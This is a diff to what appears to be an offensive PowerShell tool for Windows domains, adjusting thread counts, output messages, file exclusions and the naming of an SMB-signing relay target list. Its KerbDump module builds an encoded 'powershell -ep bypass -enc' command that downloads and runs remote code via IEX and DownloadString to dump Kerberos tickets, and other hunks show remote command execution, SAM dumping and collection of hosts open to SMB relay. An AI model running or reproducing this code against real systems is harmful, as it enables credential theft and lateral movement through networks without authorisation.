@@ -42,7 +42,7 @@ Param(
     [String]$LocalFileServer = "",
 
     [Parameter(Mandatory=$False, Position=13, ValueFromPipeline=$true)]
-    [String]$Threads = "20",
+    [String]$Threads = "5",
 
     [Parameter(Mandatory=$False, Position=14, ValueFromPipeline=$true)]
     [switch]$Force,
@@ -837,6 +837,12 @@ elseif ($SessionHunter){
     #""
 }
 
+elseif ($GenRelayList){
+    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
+    Write-Host "SMB Signing output will be written to $SMB"
+    #""
+}
+
 ################################################################################################################
 ######################################## Local scripts and modules #############################################
 ################################################################################################################
@@ -865,7 +871,7 @@ $usersFolderPath = "C:\Users"
 $users = Get-ChildItem -Path $usersFolderPath -Directory
 
 $uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
-$excludedStartsWith = @("ntuser.dat", "ntuser.ini")
+$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")
 
 foreach ($user in $users) {
     $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
@@ -953,8 +959,8 @@ $Files = @'
 $usersFolderPath = "C:\Users"
 $users = Get-ChildItem -Path $usersFolderPath -Directory
 
-$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
-$excludedStartsWith = @("ntuser.dat", "ntuser.ini")
+$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk", "*.tmp")
+$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")
 
 foreach ($user in $users) {
     $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
@@ -1077,7 +1083,7 @@ $Command = "powershell.exe -ep bypass -enc $base64command"
 
 # Tickets - KerbDump
 if ($Module -eq "KerbDump"){
-$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"");Invoke-Kirby"
+$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"")"
 $base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
 $Command = "powershell.exe -ep bypass -enc $base64command"
 }
@@ -1215,9 +1221,7 @@ if ($osinfo -and $Command -eq ""){
             Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
             Write-Host "   " -NoNewline
             Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-            Write-Host "SUCCESS " -NoNewline
-            Write-Host "Pwned!" -ForegroundColor "Cyan" -NoNewline
-            Write-host
+            Write-Host "SUCCESS "
 
 
 }
@@ -1386,9 +1390,7 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
              Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
              Write-Host "   " -NoNewline
              Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-             Write-Host "SUCCESS " -NoNewline
-             Write-Host "Pwned!" -ForegroundColor "Cyan" -NoNewline
-             Write-Host
+             Write-Host "SUCCESS "
              
              if ($Module -eq "SAM"){
              if ($ShowOutput){$result | Write-Host; Write-Host}
@@ -1784,8 +1786,7 @@ $a = Invoke-ServiceExec -ComputerName $ComputerName -Command $Command | Out-stri
                 Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
                 Write-Host "   " -NoNewline
                 Write-Host "[+] " -ForegroundColor "Green" -NoNewline
-                Write-Host "SUCCESS " -NoNewline
-                Write-Host "Pwned!" -ForegroundColor "Cyan"
+                Write-Host "SUCCESS "
                 if ($Command -eq "echo."){}
                 if ($Command -ne "echo." -and $Module -eq "") {$a | Write-Host}
 
@@ -1931,14 +1932,9 @@ Write-Host
                     Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
                     Write-Host "   " -NoNewline
                     Write-Host "[+] " -ForegroundColor Green -NoNewline
-                    Write-Host "SUCCESS " -NoNewline
+                    Write-Host "SUCCESS " 
 
-                    if ($AdminConfirm -eq $True) {
-                        Write-Host "Pwned!" -ForegroundColor Cyan
-                    }
-                    else {
-                        Write-Host
-                    }
+
 
                     if ($Module -eq "SAM") {
                         $b = Invoke-Command -Session $Session {IEX $Using:Command} -ErrorAction "Ignore"
@@ -3166,7 +3162,7 @@ if ($GenRelayList -and $Option -ne "Parse") {
                 }
 
                 if ($Signing -match "Signing Not Required") {
-                    $ComputerName | Out-File "$SMB\.SigningNotRequired-$Domain.txt" -Encoding "ASCII" -Append
+                    $ComputerName | Out-File "$SMB\SigningNotRequired-$Domain.txt" -Encoding "ASCII" -Append
                     Write-Host "SMB " -ForegroundColor "Yellow" -NoNewline
                     Write-Host "   " -NoNewline
 
@@ -3191,8 +3187,8 @@ if ($GenRelayList -and $Option -ne "Parse") {
             }
 
             if ($GenRelayList) {
-                $SigningUnique = Get-Content -Path "$SMB\.SigningNotRequired-$Domain.txt" | Sort-Object -Unique | Sort
-                Set-Content -Value $SigningUnique -Path "$SMB\.SigningNotRequired-$Domain.txt" -Force
+                $SigningUnique = Get-Content -Path "$SMB\SigningNotRequired-$Domain.txt" | Sort-Object -Unique | Sort
+                Set-Content -Value $SigningUnique -Path "$SMB\SigningNotRequired-$Domain.txt" -Force
             }
               
 
